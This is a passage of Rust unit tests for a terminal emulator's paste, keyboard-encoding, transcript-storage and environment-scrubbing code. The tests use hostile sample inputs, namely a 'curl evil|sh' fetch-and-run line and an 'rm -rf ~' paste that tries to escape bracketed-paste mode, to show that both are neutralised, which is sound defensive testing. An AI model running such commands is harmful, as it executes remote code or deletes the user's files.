                "printf '\\033[?2004h\\033]2;ready\\007'; IFS= read -r line; \
                 printf '\\033]2;got:%s\\007' \"$(printf %s \"$line\" | od -An -tx1 | tr -d ' \\n')\"; \
                 sleep 5"
                    .into(),
            ],
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        };
        let terminal = TerminalHandle::spawn(
            TerminalSession {
                owned_codex_listener: None,
                recovery_origin: None,
                predecessor: None,
                id: crate::model::TerminalId::new(),
                launch: recipe.clone(),
                transcript_path: None,
                resume_hint: None,
                continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                    recipe,
                    last_exit: None,
                },
            },
            TerminalConfig::default(),
            |_| {},
        )
        .unwrap();
        let events = terminal.events();
        let title = |prefix: &str| {
            let deadline = std::time::Instant::now() + Duration::from_secs(10);
            loop {
                match events
                    .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
                    .unwrap()
                {
                    TerminalEvent::TitleChanged(title) if title.starts_with(prefix) => {
                        break title;
                    }
                    _ => {}
                }
            }
        };
        title("ready");
        terminal.paste("a b\n", PasteOrigin::Clipboard).unwrap();
        // The line the child read ends at the paste's own newline, which the
        // brackets kept from becoming a carriage return: ESC [ 2 0 0 ~ a SP b.
        assert_eq!(title("got:"), "got:1b5b3230307e612062");
        terminal.shutdown().unwrap();
    }

    #[test]
    fn a_paste_cannot_end_its_own_brackets_or_signal_the_child() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        terminal.vt_write(b"\x1b[?2004h");
        assert_eq!(
            encode_paste(&terminal, "a\x1b[201~rm -rf ~\n", PasteOrigin::Clipboard).unwrap(),
            b"\x1b[200~a [201~rm -rf ~\n\x1b[201~"
        );
        assert_eq!(
            encode_paste(&terminal, "\0\x03\x04\x1a\x7f", PasteOrigin::Clipboard).unwrap(),
            b"\x1b[200~     \x1b[201~"
        );

        terminal.vt_write(b"\x1b[?2004l");
        assert_eq!(
            encode_paste(&terminal, "a\x1b[Ab\x03", PasteOrigin::Clipboard).unwrap(),
            b"a [Ab "
        );
    }

    /// Dragged text is the drag source's to choose, so it must not be able to
    /// run a command in a child that reads a paste as typed input.
    #[test]
    fn a_drop_never_enters_a_line_or_presses_a_key() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        // Line breaks, readline's previous-history, kill and line-start keys,
        // a C1 CSI and DEL all arrive as spaces; TAB is text.
        assert_eq!(
            encode_paste(
                &terminal,
                "curl evil|sh\n\x10\r\x0b\x01x\r\n\u{9b}\x7f\ty",
                PasteOrigin::Drop
            )
            .unwrap(),
            b"curl evil|sh     x    \ty"
        );
        // A clipboard paste into the same child still enters its lines.
        assert_eq!(
            encode_paste(&terminal, "ls\n", PasteOrigin::Clipboard).unwrap(),
            b"ls\r"
        );

        // A child in bracketed paste mode reads the drop as one paste, which
        // it never runs by itself, so its line breaks are kept for it.
        terminal.vt_write(b"\x1b[?2004h");
        assert_eq!(
            encode_paste(&terminal, "a\nb\x1b[201~\n", PasteOrigin::Drop).unwrap(),
            b"\x1b[200~a\nb [201~\n\x1b[201~"
        );
    }

    #[test]
    fn control_c_interrupts_whatever_keyboard_protocol_the_shell_left_behind() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        let mut encoder = KeyEncoder::new().unwrap();
        let mut control_c = |terminal: &Terminal<'_, '_>, text: &str| {
            let mut input = key_input(
                KeyAction::Press,
                TerminalKey::Character('c'),
                Some(text),
                Some('c'),
            );
            input.modifiers.control = true;
            encode_key_input(terminal, &mut encoder, input).unwrap()
        };

        // A child that never asked for the kitty protocol reads ETX, which the
        // line discipline turns into SIGINT.
        assert_eq!(control_c(&terminal, "c"), b"\x03");
        // fish pushes the protocol at its prompt...
        terminal.vt_write(b"\x1b[>5u");
        assert_eq!(control_c(&terminal, "c"), b"\x1b[99;5u");
        // ...and pops it before running a command, which reads ETX again.
        terminal.vt_write(b"\x1b[<u");
        assert_eq!(control_c(&terminal, "c"), b"\x03");
        // Handed the ETX itself as the key's text, the encoder has no key to
        // name and never produces one, which is why the widget hands over
        // what the key types without Ctrl.
        assert_eq!(control_c(&terminal, "\u{3}"), b"\x1b[3;5u");

        // The other control characters come from the key's own text as well,
        // and a chord with no control character of its own is named instead.
        let control = KeyModifiers {
            control: true,
            ..KeyModifiers::default()
        };
        for (key, text, unshifted, modifiers, expected) in [
            (' ', " ", ' ', control, &b"\x00"[..]),
            ('2', "2", '2', control, b"\x00"),
            ('/', "/", '/', control, b"\x1f"),
            (
                'c',
                "c",
                'c',
                KeyModifiers {
                    alt: true,
                    ..control
                },
                b"\x1b\x03",
            ),
            (
                'a',
                "A",
                'a',
                KeyModifiers {
                    shift: true,
                    ..control
                },
                b"\x1b[97;6u",
            ),
            ('[', "[", '[', control, b"\x1b[91;5u"),
        ] {
            let mut input = key_input(
                KeyAction::Press,
                TerminalKey::Character(key),
                Some(text),
                Some(unshifted),
            );
            input.modifiers = modifiers;
            assert_eq!(
                encode_key_input(&terminal, &mut encoder, input).unwrap(),
                expected,
                "{modifiers:?} {text:?}"
            );
        }

        // Keys that type control characters even without Ctrl are encoded
        // from the key alone.
        for (key, expected) in [
            (TerminalKey::Enter, &b"\r"[..]),
            (TerminalKey::Tab, b"\t"),
            (TerminalKey::Escape, b"\x1b"),
        ] {
            let input = key_input(KeyAction::Press, key, None, None);
            assert_eq!(
                encode_key_input(&terminal, &mut encoder, input).unwrap(),
                expected,
                "{key:?}"
            );
        }
    }

    #[test]
    fn control_c_interrupts_on_a_non_latin_layout() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        let mut encoder = KeyEncoder::new().unwrap();
        // Ctrl+С on a Russian layout: the widget names the Latin key in its
        // place and hands over the layout's own text.
        let mut control = |terminal: &Terminal<'_, '_>, key, typed: &str| {
            let mut input = key_input(
                KeyAction::Press,
                TerminalKey::Character(key),
                Some(typed),
                typed.chars().next(),
            );
            input.modifiers.control = true;
            encode_key_input(terminal, &mut encoder, input).unwrap()
        };
        assert_eq!(control(&terminal, 'c', "с"), b"\x03");
        // The punctuation keys follow the US key in their place, into whatever
        // Ghostty makes of that key: Ctrl+Ъ is Ctrl+], and Ctrl+Х is Ctrl+[,
        // which Ghostty keeps as CSI u after fixterms rather than a bare ESC.
        assert_eq!(control(&terminal, ']', "ъ"), b"\x1d");
        assert_eq!(control(&terminal, '[', "х"), "\x1b[1093;5u".as_bytes());
        // A kitty child reads the layout's key, and its base-layout key when
        // it asks for alternates.
        terminal.vt_write(b"\x1b[>1u");
        assert_eq!(control(&terminal, 'c', "с"), "\x1b[1089;5u".as_bytes());
        terminal.vt_write(b"\x1b[=5u");
        assert_eq!(control(&terminal, 'c', "с"), "\x1b[1089::99;5u".as_bytes());
    }

    #[test]
    fn control_backspace_kills_words_only_in_legacy_encoding() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        let mut encoder = KeyEncoder::new().unwrap();
        for action in [KeyAction::Press, KeyAction::Repeat, KeyAction::Release] {
            let mut input = key_input(action, TerminalKey::Backspace, None, None);
            input.modifiers.control = true;
            let bytes = encode_key_input(&terminal, &mut encoder, input).unwrap();
            assert_eq!(
                bytes,
                if action == KeyAction::Release {
                    &b""[..]
                } else {
                    &b"\x17"[..]
                }
            );
        }
        terminal.vt_write(b"\x1b[>1u");
        let mut input = key_input(KeyAction::Press, TerminalKey::Backspace, None, None);
        input.modifiers.control = true;
        assert_eq!(
            encode_key_input(&terminal, &mut encoder, input).unwrap(),
            b"\x1b[127;5u"
        );
    }

    #[test]
    fn legacy_repeats_encode_once_as_ordinary_key_presses() {
        let terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 1_000,
        })
        .unwrap();
        let mut encoder = KeyEncoder::new().unwrap();
        let cases = [
            (TerminalKey::ArrowDown, None, None, &b"\x1b[B"[..]),
            (TerminalKey::Character('x'), Some("x"), Some('x'), &b"x"[..]),
            (TerminalKey::Backspace, None, None, &b"\x7f"[..]),
        ];

        for (key, text, unshifted_codepoint, expected) in cases {
            let press = encode_key_input(
                &terminal,
                &mut encoder,
                key_input(KeyAction::Press, key, text, unshifted_codepoint),
            )
            .unwrap();
            let repeat = encode_key_input(
                &terminal,
                &mut encoder,
                key_input(KeyAction::Repeat, key, text, unshifted_codepoint),
            )
            .unwrap();

            assert_eq!(press, expected, "unexpected press encoding for {key:?}");
            assert_eq!(repeat, expected, "unexpected repeat encoding for {key:?}");
        }
    }

    #[test]
    fn event_reporting_protocol_preserves_repeat_semantics() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 1_000,
        })
        .unwrap();
        terminal.vt_write(b"\x1b[>2u");
        assert!(
            terminal
                .kitty_keyboard_flags()
                .unwrap()
                .contains(key::KittyKeyFlags::REPORT_EVENTS)
        );
        let mut encoder = KeyEncoder::new().unwrap();

        let press = encode_key_input(
            &terminal,
            &mut encoder,
            key_input(KeyAction::Press, TerminalKey::ArrowDown, None, None),
        )
        .unwrap();
        let repeat = encode_key_input(
            &terminal,
            &mut encoder,
            key_input(KeyAction::Repeat, TerminalKey::ArrowDown, None, None),
        )
        .unwrap();

        assert_eq!(press, b"\x1b[1;1:1B");
        assert_eq!(repeat, b"\x1b[1;1:2B");
    }

    /// A generation the subscriber has not acknowledged must not silence the
    /// next one. `capture_if_ready` is what holds this protocol to one wake
    /// per drawn frame, so the announcement itself must not also wait for a
    /// draw: an edge the callback dropped - a repaint broadcast while no
    /// subscriber was visible - would otherwise freeze the terminal until
    /// something unrelated repainted it.
    #[test]
    fn each_published_generation_is_announced_once_without_an_acknowledgement() {
        let wakes = Arc::new(AtomicUsize::new(0));
        let published = test_published(true, Arc::clone(&wakes));

        published.publish(snapshot(1));
        published.publish(snapshot(2));
        assert_eq!(wakes.load(Ordering::SeqCst), 2);

        // Acknowledging returns capture credit and announces nothing.
        published.acknowledge(2);
        assert_eq!(wakes.load(Ordering::SeqCst), 2);
        assert_eq!(published.capture_rx.try_recv(), Ok(()));
    }

    #[test]
    fn hidden_publication_suppresses_visual_wakes() {
        let wakes = Arc::new(AtomicUsize::new(0));
        let published = test_published(false, Arc::clone(&wakes));

        published.publish(snapshot(1));

        assert_eq!(published.snapshot.load().generation, 1);
        assert_eq!(wakes.load(Ordering::SeqCst), 0);
    }

    #[test]
    fn visibility_reveal_emits_latest_snapshot_once() {
        let wakes = Arc::new(AtomicUsize::new(0));
        let published = test_published(false, Arc::clone(&wakes));
        published.publish(snapshot(4));

        published.visible.store(true, Ordering::Release);
        published.request_wake(4);
        published.request_wake(4);

        assert_eq!(wakes.load(Ordering::SeqCst), 1);
    }

    #[test]
    fn transcript_writer_privatizes_storage_and_preserves_append_behavior() {
        let root = tempdir().unwrap();
        let directory = root.path().join("transcripts");
        fs::create_dir(&directory).unwrap();
        fs::set_permissions(&directory, fs::Permissions::from_mode(0o755)).unwrap();
        let path = directory.join("terminal.log");
        fs::write(&path, b"before\n").unwrap();
        fs::set_permissions(&path, fs::Permissions::from_mode(0o644)).unwrap();

        let writer = TranscriptWriter::start(path.clone(), TerminalId::new(), 1, 1 << 20).unwrap();
        writer.send(b"after\n".to_vec()).unwrap();
        writer.finish();

        assert_eq!(fs::read(&path).unwrap(), b"before\nafter\n");
        assert_eq!(
            fs::metadata(&directory).unwrap().permissions().mode() & 0o777,
            0o700
        );
        assert_eq!(
            fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600
        );
    }

    #[test]
    fn transcript_writer_creates_private_storage() {
        let root = tempdir().unwrap();
        let directory = root.path().join("new-transcripts");
        let path = directory.join("terminal.log");

        TranscriptWriter::start(path.clone(), TerminalId::new(), 1, 1 << 20)
            .unwrap()
            .finish();

        assert_eq!(
            fs::metadata(&directory).unwrap().permissions().mode() & 0o777,
            0o700
        );
        assert_eq!(
            fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600
        );
    }

    #[test]
    fn transcript_writer_stops_at_size_cap_with_marker() {
        let root = tempdir().unwrap();
        let path = root.path().join("terminal.log");

        let writer = TranscriptWriter::start(path.clone(), TerminalId::new(), 64, 16).unwrap();
        writer.send(vec![b'x'; 64]).unwrap();
        writer.send(b"discarded\n".to_vec()).unwrap();
        writer.finish();

        let content = fs::read(&path).unwrap();
        assert!(
            content.ends_with(TRANSCRIPT_TRUNCATED_MARKER),
            "capped transcript should end with the truncation marker"
        );
        assert!(
            content.len() <= 16 + TRANSCRIPT_TRUNCATED_MARKER.len(),
            "capped transcript should not grow past the cap plus marker"
        );
    }

    #[test]
    fn transcript_writer_caps_preexisting_oversized_file() {
        let root = tempdir().unwrap();
        let path = root.path().join("terminal.log");
        fs::write(&path, vec![b'y'; 32]).unwrap();

        let writer = TranscriptWriter::start(path.clone(), TerminalId::new(), 64, 16).unwrap();
        writer.send(b"new output\n".to_vec()).unwrap();
        writer.finish();

        let content = fs::read(&path).unwrap();
        assert_eq!(
            content,
            [vec![b'y'; 32], TRANSCRIPT_TRUNCATED_MARKER.to_vec()].concat(),
            "oversized transcript should keep existing bytes and record nothing more"
        );
    }

    #[test]
    fn transcript_writer_rejects_file_and_directory_symlinks() {
        let root = tempdir().unwrap();
        let directory = root.path().join("transcripts");
        fs::create_dir(&directory).unwrap();
        let victim = directory.join("victim");
        fs::write(&victim, b"unchanged").unwrap();
        let linked_file = directory.join("linked.log");
        symlink(&victim, &linked_file).unwrap();

        assert!(TranscriptWriter::start(linked_file, TerminalId::new(), 1, 1 << 20).is_err());
        assert_eq!(fs::read(&victim).unwrap(), b"unchanged");

        let real_directory = root.path().join("real");
        fs::create_dir(&real_directory).unwrap();
        let linked_directory = root.path().join("linked-directory");
        symlink(&real_directory, &linked_directory).unwrap();
        assert!(
            TranscriptWriter::start(
                linked_directory.join("terminal.log"),
                TerminalId::new(),
                1,
                1 << 20
            )
            .is_err()
        );
    }

    #[test]
    fn command_and_pty_channels_are_bounded() {
        let (commands, _receiver) = command_channel(1);
        commands.try_send(Command::Hide).unwrap();
        assert!(matches!(
            commands.try_send(Command::Reveal),
            Err(TrySendError::Full(_))
        ));

        let (pty, _receiver) = crossbeam_channel::bounded(1);
        pty.try_send(PtyMessage::Bytes(vec![1])).unwrap();
        assert!(matches!(
            pty.try_send(PtyMessage::Bytes(vec![2])),
            Err(TrySendError::Full(_))
        ));
    }
    #[test]
    fn hidden_idle_wait_is_driven_by_commands_and_child_exit_channels() {
        let (command_tx, command_rx) = command_channel(1);
        let (_pty_tx, pty_rx) = crossbeam_channel::bounded(1);
        let (child_exit_tx, child_exit_rx) = crossbeam_channel::bounded(1);

        command_tx.send(Command::Hide).unwrap();
        assert!(matches!(
            wait_for_worker_event(
                &command_rx,
                &pty_rx,
                &child_exit_rx,
                &crossbeam_channel::never(),
                false,
                true,
                FOREGROUND_POLL_MIN,
                None,
            ),
            WorkerEvent::Command(Some(Command::Hide))
        ));

        child_exit_tx
            .send(Ok(ExitStatus::with_exit_code(7)))
            .unwrap();
        assert!(matches!(
            wait_for_worker_event(
                &command_rx,
                &pty_rx,
                &child_exit_rx,
                &crossbeam_channel::never(),
                false,
                true,
                FOREGROUND_POLL_MIN,
                None,
            ),
            WorkerEvent::ChildExit(Some(Ok(status))) if status.exit_code() == 7
        ));
    }

    #[test]
    fn child_exit_is_published_exactly_once() {
        let deliveries = AtomicUsize::new(0);
        let (event_tx, event_rx) = crossbeam_channel::unbounded();
        let mut exited = false;

        for status in [7, 8] {
            if let Some(event) =
                child_exit_event(&mut exited, Ok(ExitStatus::with_exit_code(status)), false)
            {
                deliveries.fetch_add(1, Ordering::SeqCst);
                event_tx.send(event).unwrap();
            }
        }

        assert_eq!(deliveries.load(Ordering::SeqCst), 1);
        assert!(matches!(
            event_rx.try_recv(),
            Ok(TerminalEvent::Exited {
                exit_code: 7,
                signal: None,
                intentional: false,
            })
        ));
        assert!(event_rx.try_recv().is_err());
    }

    #[test]
    fn close_receipt_suppresses_only_its_requested_kill_not_crashes_or_wait_errors() {
        use std::os::unix::process::ExitStatusExt;

        let killed = || ExitStatus::from(std::process::ExitStatus::from_raw(libc::SIGKILL));
        assert!(matches!(
            child_exit_event(&mut false, Ok(killed()), true),
            Some(TerminalEvent::Exited {
                intentional: true,
                signal: Some(_),
                ..
            })
        ));
        assert!(matches!(
            child_exit_event(&mut false, Ok(killed()), false),
            Some(TerminalEvent::Exited {
                intentional: false,
                ..
            })
        ));
        let crashed = ExitStatus::from(std::process::ExitStatus::from_raw(libc::SIGSEGV));
        assert!(matches!(
            child_exit_event(&mut false, Ok(crashed), true),
            Some(TerminalEvent::Exited {
                intentional: false,
                ..
            })
        ));
        assert!(matches!(
            child_exit_event(&mut false, Ok(ExitStatus::with_exit_code(7)), true),
            Some(TerminalEvent::Exited {
                exit_code: 7,
                intentional: false,
                ..
            })
        ));
        assert!(matches!(
            child_exit_event(&mut false, Err("reaper failed".into()), true),
            Some(TerminalEvent::Error {
                operation: "wait for child",
                ..
            })
        ));
    }

    fn env_recipe(environment: BTreeMap<String, String>) -> LaunchRecipe {
        LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sh".to_owned(),
            arguments: Vec::new(),
            working_directory: PathBuf::from("/"),
            environment,
        }
    }

    #[test]
    fn child_environment_advertises_our_own_terminal_identity() {
        let command = command_from_recipe(&env_recipe(BTreeMap::new()));

        assert_eq!(command.get_env("TERM"), Some(OsStr::new("xterm-256color")));
        assert_eq!(command.get_env("COLORTERM"), Some(OsStr::new("truecolor")));
        assert_eq!(command.get_env("TERM_PROGRAM"), Some(OsStr::new("cagents")));
        assert_eq!(
            command.get_env("TERM_PROGRAM_VERSION"),
            Some(OsStr::new(crate::VERSION))
        );
        // The test below proves the scrub removes names; this one proves
        // `command_from_recipe` still calls it. Only markers this host
        // actually set can witness that, so the assertion is conditional
        // rather than absent: on a host inside kitty or tmux it is real
        // coverage of the call site, and on a bare host it costs nothing.
        for name in INHERITED_TERMINAL_MARKERS {
            if matches!(*name, "TERM_PROGRAM" | "TERM_PROGRAM_VERSION" | "COLORTERM") {
                // Set again, deliberately, after the scrub.
                continue;
            }
            if std::env::var_os(name).is_some() {
                assert_eq!(command.get_env(name), None, "{name} reached the child");
            }
        }
    }

    #[test]
    fn every_inherited_marker_is_dropped_from_the_child_environment() {
        // Planted rather than inherited: `CommandBuilder::new` seeds its map
        // from `std::env::vars_os`, so asserting absence on a fresh command
        // would pass on any host that never set these - which is every host
        // for most of the list, and so would pass with the scrub deleted.
        let mut command = CommandBuilder::new("/bin/sh");
        command.env_clear();
        for name in INHERITED_TERMINAL_MARKERS {
            command.env(name, "planted");
        }

        scrub_inherited_markers(&mut command);

        for name in INHERITED_TERMINAL_MARKERS {
            assert_eq!(command.get_env(name), None, "{name} survived the scrub");
        }
        // Each control channel named as well, so that shortening the list is a
        // test failure and not merely a smaller loop: these reach the user's
        // real kitty instance, multiplexer session, Konsole and editor.
        for channel in [
            "KITTY_LISTEN_ON",
            "TMUX",
            "TMUX_PANE",
            "STY",
            "ZELLIJ",
            "ZELLIJ_SESSION_NAME",
            "ZELLIJ_PANE_ID",
            "KONSOLE_DBUS_SERVICE",
            "KONSOLE_DBUS_SESSION",
            "NVIM",
            "NVIM_LISTEN_ADDRESS",
            "VSCODE_IPC_HOOK_CLI",
            "EMACS_SERVER_FILE",
        ] {
            assert!(
                INHERITED_TERMINAL_MARKERS.contains(&channel),
                "{channel} is not scrubbed"
            );
        }
    }

    #[test]
    fn inherited_color_policy_does_not_disable_or_misidentify_the_pty() {
        let mut command = CommandBuilder::new("/bin/sh");
        command.env_clear();
        for (name, value) in [
            ("NO_COLOR", "1"),
            ("FORCE_COLOR", "0"),
            ("CLICOLOR", "0"),
            ("CLICOLOR_FORCE", "1"),
            ("COLORFGBG", "0;15"),
        ] {
            command.env(name, value);
        }
        scrub_inherited_markers(&mut command);
        for name in [
            "NO_COLOR",
            "FORCE_COLOR",
            "CLICOLOR",
            "CLICOLOR_FORCE",
            "COLORFGBG",
        ] {
            assert_eq!(command.get_env(name), None, "{name} reached the PTY");
        }
    }

    #[test]
    fn explicit_recipe_environment_overrides_terminal_defaults() {
        let command = command_from_recipe(&env_recipe(BTreeMap::from([
            ("TERM".to_owned(), "dumb".to_owned()),
            ("KITTY_WINDOW_ID".to_owned(), "3".to_owned()),
            ("NO_COLOR".to_owned(), "1".to_owned()),
            ("FORCE_COLOR".to_owned(), "0".to_owned()),
            ("CLICOLOR".to_owned(), "0".to_owned()),
            ("CLICOLOR_FORCE".to_owned(), "1".to_owned()),
            ("COLORFGBG".to_owned(), "0;15".to_owned()),
            ("COLORTERM".to_owned(), "24bit".to_owned()),
        ])));

        assert_eq!(command.get_env("TERM"), Some(OsStr::new("dumb")));
        assert_eq!(command.get_env("KITTY_WINDOW_ID"), Some(OsStr::new("3")));
        assert_eq!(command.get_env("COLORTERM"), Some(OsStr::new("24bit")));
        assert_eq!(command.get_env("NO_COLOR"), Some(OsStr::new("1")));
        assert_eq!(command.get_env("FORCE_COLOR"), Some(OsStr::new("0")));
        assert_eq!(command.get_env("CLICOLOR"), Some(OsStr::new("0")));
        assert_eq!(command.get_env("CLICOLOR_FORCE"), Some(OsStr::new("1")));
        assert_eq!(command.get_env("COLORFGBG"), Some(OsStr::new("0;15")));
    }

    #[test]
    fn removed_managed_home_cannot_relaunch_from_final_pty_environment() {
        const CHILD: &str = "CAGENTS_REMOVED_ACCOUNT_PTY_TEST";
        if std::env::var_os(CHILD).is_none() {
            let directory = tempfile::tempdir().unwrap();
            for mode in ["inherited", "returned"] {
                assert!(std::process::Command::new(std::env::current_exe().unwrap())
                    .args(["--exact", "terminal::worker::tests::removed_managed_home_cannot_relaunch_from_final_pty_environment", "--nocapture"])
                    .env_clear().env(CHILD, mode).env("HOME", directory.path())
                    .env("XDG_DATA_HOME", directory.path().join("data"))
                    .env("PATH", "/usr/bin:/bin")
                    .env("CODEX_HOME", directory.path().join("data").join(crate::instance::STORAGE_NAME).join("accounts/codex/12345678-1234-4234-8234-123456789abc"))
                    .status().unwrap().success());
            }
            return;
        }
        let homes = crate::account::home::Homes::installation().unwrap();
        let home = homes.path(
            crate::agent::Provider::Codex,
            uuid::Uuid::parse_str("12345678-1234-4234-8234-123456789abc").unwrap(),
        );
        // The child would recreate this absent home if authorization accidentally
        // inspected only the durable recipe rather than the actual launch.
        let mut recipe = env_recipe(BTreeMap::new());
        recipe.arguments = vec!["-c".into(), "mkdir -p \"$CODEX_HOME\"".into()];
        let returned = std::env::var(CHILD).unwrap() == "returned";
        let config = TerminalConfig {
            execution_environment: returned.then(|| {
                crate::terminal_ipc::ChatExecutionEnvironment(BTreeMap::from([(
                    "CODEX_HOME".into(),
                    home.to_str().unwrap().into(),
                )]))
            }),
            ..TerminalConfig::default()
        };
        let session = TerminalSession {
            owned_codex_listener: None,
            recovery_origin: None,
            predecessor: None,
            id: crate::model::TerminalId::new(),
            launch: recipe.clone(),
            transcript_path: None,
            resume_hint: None,
            continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                recipe,
                last_exit: None,
            },
        };
        let (_tx, commands) = command_channel(1);
        let (events, _receiver) = crossbeam_channel::unbounded();
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        let failure = Worker::start(session, config, commands, events, published)
            .err()
            .expect("removed account blocks PTY creation");
        assert!(failure.contains("removed"), "{failure}");
        assert!(
            !home.exists(),
            "the CLI must never recreate the removed home"
        );
    }

    #[test]
    fn selected_account_removals_win_in_fresh_and_returned_pty_children() {
        let directory = tempfile::tempdir().unwrap();
        for returned in [false, true] {
            let mut recipe = env_recipe(BTreeMap::from([
                ("CODEX_API_KEY".into(), "fixture-key".into()),
                ("CODEX_HOME".into(), "/selected".into()),
            ]));
            recipe.working_directory = directory.path().into();
            recipe.unset_environment.insert("CODEX_API_KEY".into());
            recipe.arguments = vec![
                "-c".into(),
                "[ -z \"${CODEX_API_KEY+x}\" ] && [ \"$CODEX_HOME\" = /selected ] && : > isolated"
                    .into(),
            ];
            let config = TerminalConfig {
                execution_environment: returned.then(|| {
                    crate::terminal_ipc::ChatExecutionEnvironment(recipe.environment.clone())
                }),
                ..TerminalConfig::default()
            };
            let (worker, _) = capture_worker_with(recipe, config);
            let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
            while !directory.path().join("isolated").exists() {
                assert!(
                    std::time::Instant::now() < deadline,
                    "PTY did not enforce selected account environment"
                );
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
            worker.run();
            std::fs::remove_file(directory.path().join("isolated")).unwrap();
        }
    }

    const SCROLLBACK_LINES: usize = 2000;
    /// A 0.67s flick at 60 Hz presentation.
    const FRAMES: usize = 40;
    /// What a 120 Hz high-resolution trackpad delivers inside one 60 Hz frame,
    /// which is the situation issue #101 is about.
    const NOTCHES_PER_FRAME: usize = 8;
    const LINES_PER_NOTCH: isize = 3;

    /// One measured scroll run: what the pipeline actually did, what it cost,
    /// where it started and where it ended up.
    #[derive(Debug)]
    struct ScrollRun {
        commands: usize,
        captures: usize,
        wire_bytes: usize,
        origin: (u64, String),
        offset: u64,
        screen: String,
        latency: crate::performance::LatencySummary,
    }

    /// Applies `deltas` to a filled scrollback, driving every command through
    /// the viewport re-read, the snapshot capture and the wire encoding the
    /// daemon would have performed for it.
    fn scroll_run(deltas: impl IntoIterator<Item = isize>) -> ScrollRun {
        use crate::performance::{Action, Recorder};
        use crate::terminal::ipc::{TerminalSnapshot, write_frame};
        use std::time::Instant;

        // libghostty sizes scrollback from its own page pool rather than from
        // a row count, so the pool is asked for generously and the workload
        // then checks that it never reached a bound by accident.
        let (mut worker, _events) = capture_worker_with(
            LaunchRecipe {
                unset_environment: Default::default(),
                program: "/bin/true".into(),
                arguments: Vec::new(),
                working_directory: PathBuf::from("/"),
                environment: BTreeMap::new(),
            },
            TerminalConfig {
                max_scrollback_bytes: 4_000_000,
                ..TerminalConfig::default()
            },
        );
        // A deterministic 80-column history, wide enough that a viewport
        // re-read and its wire encoding both do realistic per-cell work.
        let mut history = Vec::with_capacity(SCROLLBACK_LINES * 80);
        for line in 0..SCROLLBACK_LINES {
            history.extend_from_slice(format!("{line:<78}\r\n").as_bytes());
        }
        worker.process_output(history);

        let screen = |snapshot: &RenderSnapshot| {
            snapshot
                .lines
                .iter()
                .map(|line| {
                    line.cells
                        .iter()
                        .map(|cell| cell.text.as_str())
                        .collect::<String>()
                })
                .collect::<Vec<_>>()
                .join("\n")
        };
        let mut recorder = Recorder::default();
        let mut previous = worker.published.snapshot.load_full();
        let origin = (previous.scroll.offset, screen(&previous));
        let mut commands = 0;
        let mut captures = 0;
        let mut wire_bytes = 0;
        for delta in deltas {
            // Returning credit first is what the UI does after drawing, so the
            // worker is free to capture the command that follows.
            worker.published.acknowledge(worker.generation);
            let generation = recorder.commit(Action::TerminalScroll).unwrap();
            assert!(
                !worker.handle_command(Command::Scroll(ScrollCommand::Delta(delta))),
                "a scroll command must not request shutdown"
            );
            let published = worker.published.snapshot.load_full();
            if published.generation != previous.generation {
                captures += 1;
                let mut frame = Vec::new();
                write_frame(&mut frame, &TerminalSnapshot::diff(&published, &previous)).unwrap();
                wire_bytes += frame.len();
            }
            assert!(recorder.redraw_scheduled(generation, Instant::now()));
            previous = published;
            commands += 1;
        }

        let mut durations: Vec<_> = recorder
            .samples()
            .filter_map(|sample| sample.redraw_scheduling_ns.map(Duration::from_nanos))
            .collect();
        ScrollRun {
            commands,
            captures,
            wire_bytes,
            origin,
            offset: previous.scroll.offset,
            screen: screen(&previous),
            latency: crate::performance::LatencySummary::from_durations(&mut durations).unwrap(),
        }
    }

    /// Deterministic scroll workload for issue #101, plus the equivalence that
    /// makes coalescing safe.
    ///
    /// The widget lives in the `ui` feature graph and the emulator in `host`,
    /// so no single build can drive a wheel gesture end to end. This half
    /// measures the expensive half of the pipeline - applying a viewport move
    /// to ghostty, re-reading the viewport into a snapshot, and encoding that
    /// snapshot for the socket - and proves that folding a frame's notches
    /// into one command lands on exactly the same screen. The folding itself
    /// is covered by `terminal::widget::tests`.
    ///
    /// Timings are printed, never asserted: a `test`-profile build with an
    /// unoptimized parser gives a ratio, not a latency budget, and this crate
    /// treats even release numbers as non-gating.
    #[test]
    fn coalescing_a_frame_of_notches_costs_one_capture_and_lands_on_the_same_screen() {
        let notches = FRAMES * NOTCHES_PER_FRAME;
        let per_event = scroll_run(std::iter::repeat_n(-LINES_PER_NOTCH, notches));
        let per_frame = scroll_run(std::iter::repeat_n(
            -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
            FRAMES,
        ));

        // The whole point: the same gesture reaches the same place, showing
        // the same rows, for an eighth of the commands and captures.
        assert_eq!(per_frame.offset, per_event.offset);
        assert_eq!(per_frame.screen, per_event.screen);
        assert_eq!(per_event.captures, notches);
        assert_eq!(per_frame.captures, FRAMES);
        // A run that clamped at the top would satisfy the equality above
        // without having measured scrolling at all.
        assert!(
            per_event.offset > 0,
            "the workload must stay inside scrollback rather than clamp"
        );

        let budget = crate::performance::PerformanceBudget {
            // One coalesced move has to fit inside a 60 Hz frame alongside the
            // rest of that frame's work, so a quarter of a frame at p95.
            interaction_p95: Duration::from_micros(4_166),
            interaction_p99: Duration::from_micros(8_333),
            ..crate::performance::PerformanceBudget::default()
        };
        for (policy, run) in [("per-event", &per_event), ("per-frame", &per_frame)] {
            println!(
                "scroll workload [{policy}] commands={} captures={} wire_bytes={} \
